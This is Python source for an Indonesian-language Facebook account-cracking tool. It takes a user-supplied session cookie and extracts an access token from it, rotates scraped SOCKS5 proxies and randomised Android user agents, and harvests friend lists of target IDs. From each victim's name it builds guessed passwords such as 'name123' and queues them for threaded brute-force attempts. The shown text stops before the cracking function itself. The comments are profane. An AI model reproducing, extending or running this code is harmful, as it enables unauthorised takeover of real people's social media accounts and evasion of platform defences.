#                                 #_______________________________INFO TOOLS AND OWNER__________________________#
#                                 ________Author : FINO DAFARESTA
#                   __________Tools Cracking Facebook Only______________
#                                _________Simple For Crack Or Hacking Account FB__________
#          ________Update Toools 1 Januari 2024 New Version_______________
#                                 ________
#
#                        #_______________________________MY SUPPORT__________________________# 
#                            
#                  ____________Thanks Sudah Support Gw Buat Semuanya____________
#        Thanks Juga Buat Para Author Yang Sudah Memberi Ilmu Dunia Hacking Dan Progam Python_________
#                  Thanks For FinoDafaresta
#               Author : FinoDafaresta
#               Author : Finodafaresta
#               Author : FinoDafaresta
#               TEAM :
#               	SUMATERASELATAN_____
#               BANDUNGPRIDE__________
#                            ________HIU BRUTE FORCE______
#
#       #_______________________________INFORMASI BUAT KANG RECODE__________________________# 
#       
#       Tools Cracking Free Bro Jangan DiJual Yaa, Recode Bolleh Ganti Nama Author Izin Lah Minimal
#  Atau Lu Cantumin Nama Author Terus Nama Lu Juga Bro__________
#                  _______Kalo Modal Cuma Ngerecode Ganti Nama Author Mah_________
#        ______Anak SD Juga Bisa Bro_________
#                     _________Berjuang Bro Kalo Modal Recode Doang
#             Lu Gabakal Ada Kemajuan________________
#                        
                #_____________________IMPORT MODULE AWAL NGABANGSAT___________________#
                 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from datetime import datetime
from string import *
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()

          #_____________________GET PROXY___________________#
          
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print('Jaringan Internet Anda Bermasalah......')
prox=open('proxy.txt','r').read().splitlines()

                                          #_____________________INDICATION MAIN___________________#
                 
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,idf,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
ses=requests.Session()
princp=[]
wa = sol()
pwnya = []
pwpluss = []
ugen=[]
ugen2=[]
idf=[]
SLLW=[]     
                 
                  #_____________________USER AGENTS___________________#

for agenku in range(10000):
    rr = random.randint; rc = random.choice
    BDS = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B','OPR1','NRD90M','LRX22C','QP1A.190711.020','RP1A.200720.012','PPR1.180610.011','QCOS30.85-18-6;']))
    BDR = str(rc(['TP1A.220905.001','SP1A.210812.016','RP1A.201005.001','SKQ1.221119.001']))
    OP = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
    RL = str(rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]))
    SM = str(rc(['SM-A015M','SM-A013M','SM-A022F','SM-A025G','SM-A035M','SM-A032M','SM-A037M','SM-A045F','SM-A042F','SM-A047F','SM-A105M','SM-S102DL','SM-A107M','SM-A115AP','SM-A125U','SM-A135F','SM-A136U','SM-A145R','SM-A146U','SM-A205S','SM-A202F','SM-A207F','SM-A215U','SM-A217F','SM-A225M','SM-A226B','SM-A235M','SM-A236U','SM-A245F','SM-A305FN','SM-A307GT','SM-A315F','SM-A325F','SM-A326B','SM-A336E','SM-A346B','SM-A430F','SM-A405FN','SM-E236B','SM-S367VL','SM-J400M','SM-J530F','SM-J530G','SM-J600FN','SM-J610F','SM-S767VL','SM-A202K','SM-M015G','SM-M017F','SM-M127F','SM-N950U','SM-N9300','SM-N960F','SM-9005','SM-N981B','SM-N985F','SM-N770F','SM-N970F','SAMSUNG SM-J710FN','ZTE Blade A51 Lite RU','SAMSUNG SM-G901F','SAMSUNG SM-G531H','A95X MAX','SM-W2021','SAMSUNG A1S 11 (3180)','SAMSUNG SM-M536B','SM-M536B','SAMSUNG SM-J530F/J530FXXS9CUE5','SAMSUNG SM-M346B1','SAMSUNG TicWatch Pro 3 Ultra GPS','SAMSUNG SM-J415GN','SAMSUNG SM-J610FN','SAMSUNG GT-I9506','SAMSUNG OW20W2','SAMSUNG SM-W2021','SM-G981B','SM-N976V','SAMSUNG SM-G977N','SM-G970F','SAMSUNG SM-G935L','SM-J415N','SAMSUNG SM-J415N','SAMSUNG A51','SAMSUNG A52s','SAMSUNG A9S','SGH-I317M','SAMSUNG-SGH-I317','SGH-I317M','SGH-I317M','GINGERBREAD','GT-I9100','SM-A107M','SM-A107F','SM-A107F','SM-A107M','SM-A146U','SM-A146U','SM-A146P','E025F', 'G996B', 'A826S', 'E135F', 'G781B', 'G998B', 'F936U1', 'G361F', 'A716S', 'J327AZ', 'E426B', 'A015F', 'A015M', 'A013G', 'A013G', 'A013M', 'A013F', 'A022M', 'A022G', 'A022F', 'A025M', 'S124DL', 'A025U', 'A025A', 'A025G', 'A025F', 'A025AZ', 'A035F', 'A035M', 'A035G', 'A032F', 'A032M', 'A032F', 'A037F', 'A037U', 'A037M', 'S134DL', 'A037G', 'A105G', 'A105M', 'A105F', 'A105FN', 'A102U', 'S102DL', 'A102U1', 'A107F', 'A107M', 'A115AZ', 'A115U', 'A115U1', 'A115A', 'A115M', 'A115F', 'A125F', 'A127F', 'A125M', 'A125U', 'A127M', 'A135F', 'A137F', 'A135M', 'A136U', 'A136U1', 'A136W', 'A260F', 'A260G', 'A260F', 'A260G', 'A205GN', 'A205U', 'A205F', 'A205G', 'A205FN', 'A202F', 'A2070', 'A207F', 'A207M', 'A215U', 'A215U1', 'A217F', 'A217F', 'A217M', 'A225F', 'A225M', 'A226B', 'A226B', 'A226BR', 'A235F', 'A235M', 'A300FU', 'A300F', 'A300H', 'A310F', 'A310M', 'A320FL', 'A320F', 'A305G', 'A305GT', 'A305N', 'A305F', 'A307FN', 'A307G', 'A307GN', 'A315G', 'A315F', 'A325F', 'A325M', 'A326U', 'A326W', 'A336E', 'A336B', 'A430F', 'A405FN', 'A405FM', 'A3051', 'A3050', 'A415F', 'A426U', 'A426B', 'A5009', 'A500YZ', 'A500Y', 'A500W', 'A500L', 'A500X', 'A500XZ', 'A510F', 'A510Y', 'A520F', 'A520W', 'A500F', 'A500FU', 'A500H', 'S506DL', 'A505G', 'A505FN', 'A505U', 'A505GN', 'A505F', 'A507FN', 'A5070', 'A515F', 'A515U', 'A515U1', 'A516U', 'A516V', 'A516N', 'A516B', 'A525F', 'A525M', 'A526U', 'A526U1', 'A526B', 'A526W', 'A528B', 'A536B', 'A536U', 'A536E', 'A536V', 'A600FN', 'A600G', 'A605FN', 'A605G', 'A605GN', 'A605F', 'A6050', 'A606Y', 'A6060', 'G6200', 'A700FD', 'A700F', 'A7000', 'A700H', 'A700YD', 'A710F', 'A710M', 'A720F', 'A750F', 'A750FN', 'A750GN', 'A705FN', 'A705F', 'A705MN', 'A707F', 'A715F', 'A715W', 'A716U', 'A716V', 'A716U1', 'A716B', 'A725F', 'A725M', 'A736B', 'A530F', 'A810YZ', 'A810F', 'A810S', 'A530W', 'A530N', 'G885F', 'G885Y', 'G885S', 'A730F', 'A805F', 'G887F', 'G8870', 'A9000', 'A920F', 'A920F', 'G887N', 'A910F', 'G8850', 'A908B', 'A908N', 'A9080', 'G313HY', 'G313MY', 'G313MU', 'G316M', 'G316ML', 'G316MY', 'G313HZ', 'G313H', 'G313HU', 'G313U', 'G318H', 'G357FZ', 'G310HN', 'G357FZ', 'G850F', 'G850M', 'J337AZ', 'G386T1', 'G386T', 'G3858', 'G3858', 'A226L', 'C5000', 'C500X', 'C5010', 'C5018', 'C7000', 'C7010', 'C701F', 'C7018', 'C7100', 'C7108', 'C9000', 'C900F', 'C900Y', 'G355H', 'G355M', 'G3589W', 'G386W', 'G386F', 'G3518', 'G3586V', 'G5108Q', 'G5108', 'G3568V', 'G350E', 'G350', 'G3509I', 'G3508J', 'G3502I', 'G3502C', 'S820L', 'G360H', 'G360F', 'G360T', 'G360M', 'G361H', 'E500H', 'E500F', 'E500M', 'E5000', 'E500YZ', 'E700H', 'E700F', 'E7009', 'E700M', 'G3815', 'G3815', 'G3815', 'F127G', 'E225F', 'E236B', 'F415F', 'E5260', 'E625F', 'F900U', 'F907N', 'F900F', 'F9000', 'F907B', 'F900W', 'G150NL', 'G155S', 'G1650', 'W2015', 'G7102', 'G7105', 'G7106', 'G7108', 'G7202', 'G720N0', 'G7200', 'G720AX', 'G530T1', 'G530H', 'G530FZ', 'G531H', 'G530BT', 'G532F', 'G531BT', 'G531M', 'J727AZ', 'J100FN', 'J100H', 'J120FN', 'J120H', 'J120F', 'J120M', 'J111M', 'J111F', 'J110H', 'J110G', 'J110F', 'J110M', 'J105H', 'J105Y', 'J105B', 'J106H', 'J106F', 'J106B', 'J106M', 'J200F', 'J200M', 'J200G', 'J200H', 'J200F', 'J200GU', 'J260M', 'J260F', 'J260MU', 'J260F', 'J260G', 'J200BT', 'G532G', 'G532M', 'G532MT', 'J250M', 'J250F', 'J210F', 'J260AZ', 'J3109', 'J320A', 'J320G', 'J320F', 'J320H', 'J320FN', 'J330G', 'J330F', 'J330FN', 'J337V', 'J337P', 'J337A', 'J337VPP', 'J337R4', 'J327VPP', 'J327V', 'J327P', 'J327R4', 'S327VL', 'S337TL', 'S367VL', 'J327A', 'J327T1', 'J327T', 'J3110', 'J3119S', 'J3119', 'S320VL', 'J337T', 'J400M', 'J400F', 'J400F', 'J410F', 'J410G', 'J410F', 'J415FN', 'J415F', 'J415G', 'J415GN', 'J415N', 'J500FN', 'J500M', 'J510MN', 'J510FN', 'J510GN', 'J530Y', 'J530F', 'J530G', 'J530FM', 'G570M', 'G570F', 'G570Y', 'J600G', 'J600FN', 'J600GT', 'J600F', 'J610F', 'J610G', 'J610FN', 'J710F', 'J700H', 'J700M', 'J700F', 'J700P', 'J700T', 'J710GN', 'J700T1', 'J727A', 'J727R4', 'J737T', 'J737A', 'J737R4', 'J737V', 'J737T1', 'J737S', 'J737P', 'J737VPP', 'J701F', 'J701M', 'J701MT', 'S767VL', 'S757BL', 'J720F', 'J720M', 'G615F', 'G615FU', 'G610F', 'G610M', 'G610Y', 'G611MT', 'G611FF', 'G611M', 'J730G', 'J730GM', 'J730F', 'J730FM', 'S727VL', 'S737TL', 'J727T1', 'J727T1', 'J727V', 'J727P', 'J727VPP', 'J727T', 'C710F', 'J810M', 'J810F', 'J810G', 'J810Y', 'A605K', 'A605K', 'A202K', 'M336K', 'A326K', 'C115', 'C115L', 'C1158', 'C1158', 'C115W', 'C115M', 'S120VL', 'M015G', 'M015F', 'M013F', 'M017F', 'M022G', 'M022F', 'M022M', 'M025F', 'M105G', 'M105M', 'M105F', 'M107F', 'M115F', 'M115F', 'M127F', 'M127G', 'M135M', 'M135F', 'M135FU', 'M205FN', 'M205F', 'M205G', 'M215F', 'M215G', 'M225FV', 'M236B', 'M236Q', 'M305F', 'M305M', 'M307F', 'M307FN', 'M315F', 'M317F', 'M325FV', 'M325F', 'M326B', 'M336B', 'M336BU', 'M405F', 'M426B', 'M515F', 'M526BR', 'M526B', 'M536B', 'M625F', 'G750H', 'G7508Q', 'G7509', 'N970U', 'N970F', 'N971N', 'N970U1', 'N770F', 'N975U1', 'N975U', 'N975F', 'N975F', 'N976N', 'N980F', 'N981U', 'N981B', 'N985F', 'N9860', 'N986N', 'N986U', 'N986B', 'N986W', 'N9008V', 'N9006', 'N900A', 'N9005', 'N900W8', 'N900', 'N9009', 'N900P', 'N9000Q', 'N9002', '9005', 'N750L', 'N7505', 'N750', 'N7502', 'N910F', 'N910V', 'N910C', 'N910U', 'N910H', 'N9108V', 'N9100', 'N915FY', 'N9150', 'N915T', 'N915G', 'N915A', 'N915F', 'N915S', 'N915D', 'N915W8', 'N916S', 'N916K', 'N916L', 'N916LSK', 'N920L', 'N920S', 'N920G', 'N920A', 'N920C', 'N920V', 'N920I', 'N920K', 'N9208', 'N930F', 'N9300', 'N930x', 'N930P', 'N930X', 'N930W8', 'N930V', 'N930T', 'N950U', 'N950F', 'N950N', 'N960U', 'N960F', 'N960U', 'N935F', 'N935K', 'N935S', 'G550T', 'G550FY', 'G5500', 'G5510', 'G550T1', 'S550TL', 'G5520', 'G5528', 'G600FY', 'G600F', 'G6000', 'G6100', 'G610S', 'G611F', 'G611L', 'G110M', 'G110H', 'G110B', 'G910S', 'G316HU', 'G977N', 'G973U1', 'G973F', 'G973W', 'G973U', 'G770U1', 'G770F', 'G975F', 'G975U', 'G970U', 'G970U1', 'G970F', 'G970N', 'G980F', 'G981U', 'G981N', 'G981B', 'G780G', 'G780F', 'G781W', 'G781U', 'G7810', 'G9880', 'G988B', 'G988U', 'G988B', 'G988U1', 'G985F', 'G986U', 'G986B', 'G986W', 'G986U1', 'G991U', 'G991B', 'G990B', 'G990E', 'G990U', 'G998U', 'G996W', 'G996U', 'G996N', 'G9960', 'S901U', 'S901B', 'S908U', 'S908U1', 'S908B', 'S9080', 'S908N', 'S908E', 'S906U', 'S906E', 'S906N', 'S906B', 'S906U1', 'G730V', 'G730A', 'G730W8', 'C105L', 'C101', 'C105', 'C105K', 'C105S', 'G900F', 'G900P', 'G900H', 'G9006V', 'G900M', 'G900V', 'G870W', 'G890A', 'G870A', 'G900FD', 'G860P', 'G901F', 'G901F', 'G800F', 'G800H', 'G903F', 'G903W', 'G920F', 'G920K', 'G920I', 'G920A', 'G920P', 'G920S', 'G920V', 'G920T', 'G925F', 'G925A', 'G925W8', 'G928F', 'G928C', 'G9280', 'G9287', 'G928T', 'G928I', 'G930A', 'G930F', 'G930W8', 'G930S', 'G930V', 'G930P', 'G930L', 'G891A', 'G935F', 'G935T', 'G935W8', 'G9350', 'G950F', 'G950W', 'G950U', 'G892A', 'G892U', 'G8750', 'G955F', 'G955U', 'G955U1', 'G955W', 'G955N', 'G960U', 'G960U1', 'G960F', 'G965U', 'G965F', 'G965U1', 'G965N', 'G9650', 'J321AZ', 'J326AZ', 'J336AZ', 'T116', 'T116NU', 'T116NY', 'T116NQ', 'T2519', 'G318HZ', 'T255S', 'W2016', 'W2018', 'W2019', 'W2021', 'W2022', 'G600S', 'E426S', 'G3812', 'G3812B', 'G3818', 'G388F', 'G389F', 'G390F', 'G398FN']))
    smbf = f'Mozilla/5.0 (Linux; Android {str(rr(8,14))}; {SM}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,10))}.{str(rr(1,10))} Chrome/{str(rr(1,199))}.0.{str(rr(1000,6000))}.{str(rr(1,199))} Mobile Safari/537.36'
    smbf2 = f'Mozilla/5.0 (Linux; Android {str(rr(7,14))}; {SM} Build/{BDS}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,199))}.0.{str(rr(1000,6000))}.{str(rr(1,180))} Mobile Safari/537.36'
    smbf3 = f'Mozilla/5.0 (Linux; Android {str(rr(7,15))}; {RL} Build/{BDR}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,9))}.0 Chrome/{str(rr(80,130))}.0.{str(rr(1000,6000))}.{str(rr(50,150))} Mobile Safari/537.36'
    smbf4 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {OP}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70,99))}.0.{str(rr(1000,5000))}.{str(rr(90,199))} Mobile Safari/537.36'
    Sllowly = rc([smbf,smbf2,smbf3,smbf4])
    ugen.append(Sllowly)
	
                              #=========== [ WARNA BIASA CUY ] ===========#
       
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
        
                                    #=========== [ BULAN DAN TANGGAL ] ===========#

sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

               #=========== [ PENYIMPANAN ] ===========#

bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
okc = f'OK-{hari}-{bulan}-{tahun}.txt'
cpc = f'CP-{hari}-{bulan}-{tahun}.txt'
  
                 #=========== [ TAMBAHAN ] ===========#
       
def clear():
	os.system('clear')
def back():
	menu()
   
            #===========SEMPEL BANNER 2===========#
           
def ______LOGO_____GOBLOKKK_________():
	wa.print(f'''[white]
╔═╗╦  ╦  ╔═╗╦ ╦╦ ╦ ╦  ╔╦╗╔╗ ╔═╗ 
[red]╚═╗║  ║  ║ ║║║║║ ╚╦╝  ║║║╠╩╗╠╣  
[green]╚═╝╩═╝╩═╝╚═╝╚╩╝╩═╝╩   ╩ ╩╚═╝╚ ''')

def _______LOGO____DUA____KONTOLLL_____():
	os.system('clear')
	wa.print(f'''\r
[white]╔╦╗╔═╗╔═╗╦╔═╗  ╔═╗╦═╗╔═╗╔═╗╦╔═╦╔╗╔╔═╗
[green]║║║╠═╣╠╣ ║╠═╣  ║  ╠╦╝╠═╣║  ╠╩╗║║║║║ ╦
[red]╩ ╩╩ ╩╚  ╩╩ ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝''')

         #===========CEK KUEH & TOKEN LISTRIK===========#
         
def _______login____dulu____lahhh___():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			____login___lagi____dek()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		____login___lagi____dek()


def ____login___lagi____dek():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%Login Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
		
		
                 #=========== [ MENUA BERSAMAMU ] ===========#
                 
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		____login___lagi____dek()
	os.system('clear')
	______LOGO_____GOBLOKKK_________()
	print('')
	print(f'{P}{P}[{H}•{P}] 01. Massal   {P}[{H}ON{P}]')
	print(f'{P}{P}[{H}•{P}] 02. 𝐄𝐱𝐢𝐭𝐞𝐝   {P}[{H}ON{P}]')
	mek = input(f' ┗━ 𝙸𝚗𝚙𝚞𝚝 : ')
	if mek in ['1','01']:
		_______Sllowly____Massall________()
	elif mein in ['2','02']:
		print(f'Sukses Remove Cookies And Token')
		os.system('rm -rf .cok.txt')
		os.system('rm -rf .token.txt')
	else: 
		exit()
		 
                                          #_____________________Crack From Massalll_____________________#                           

def _______Sllowly____Massall________():
    try:
    	token = open('.token.txt', 'r').read()
    	cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{m}cookies telah kadaluarsa ster')
        exit()
    try:
    	___Sllowly___Xyraaa________ = int(input(f"{P}[{H}?{P}] 𝙹𝚞𝚖𝚕𝚊𝚑 𝙸𝙳 : "))	
    except ValueError:
        exit()
    if ___Sllowly___Xyraaa________ < 1 or ___Sllowly___Xyraaa________ > 1000:
        exit()
    ses = requests.Session()
    ____Sllowly___Xyraaa_________ = 0
    for yantti in range(___Sllowly___Xyraaa________):
        ____Sllowly___Xyraaa_________ += 1
        Masukan = input(f"{P}[{H}?{P}] 𝙸𝚗𝚙𝚞𝚝 𝙸𝙳 𝚈𝚊𝚗𝚐 𝙺𝚎 {____Sllowly___Xyraaa_________}\n{P}[{H}+{P}] 𝙸𝚗𝚙𝚞𝚝 𝙸𝙳 : ")
        idf.append(Masukan)
    for user in idf:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
    	setting_______method_____muh()
    except requests.exceptions.ConnectionError:
        print(f" {P}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f" {P}{M}  teman tidak publik")
        exit()
                          #_____________SETTING METHOD______________#
          
def setting_______method_____muh():
	for ___leleuss___duhh in id:
		id2.insert(0,___leleuss___duhh)
	print('')
	pwplus=input(f"{P}[{H}?{P}] Tambahkan Password Manual y/t : ") 
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku = input(f'{P}[{H}?{P}] 𝙸𝚗𝚙𝚞𝚝 : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	_______passwordlist________() 
	
          #_____________PASS WORDLIST_____________#
          
def _______passwordlist________(): 
	clear()
	_______LOGO____DUA____KONTOLLL_____()
	wa.print(f'\r[white]Author : FassaXynaraa')
	wa.print(f'\r[white]𝚃𝚘𝚝𝚊𝚕 𝙸𝚍𝚜 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙲𝚘𝚕𝚕𝚎𝚌𝚝:[green] '+str(len(id)))
	wa.print(f'\r[white]Mainin Modpes pas 50id ya kontol') 
	print(f'')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			____sllowly_____pw____ = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					____sllowly_____pw____.append(frs+'123')
					____sllowly_____pw____.append(frs+'1234')
					____sllowly_____pw____.append(frs+'12345')
					____sllowly_____pw____.append(frs+'321')
			else:
				if len(frs)<3:
					____sllowly_____pw____.append(nmf)
				else:
					____sllowly_____pw____.append(nmf)
					____sllowly_____pw____.append(frs+'123')
					____sllowly_____pw____.append(frs+'1234')
					____sllowly_____pw____.append(frs+'12345')
					____sllowly_____pw____.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					____sllowly_____pw____.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(____crack____ngentott_________,idf,____sllowly_____pw____,nmf)					
			else:
				pool.submit(____crack____ngentott_________,idf,____sllowly_____pw____,nmf)
				
                       #_________METHOD____ASYNC________#
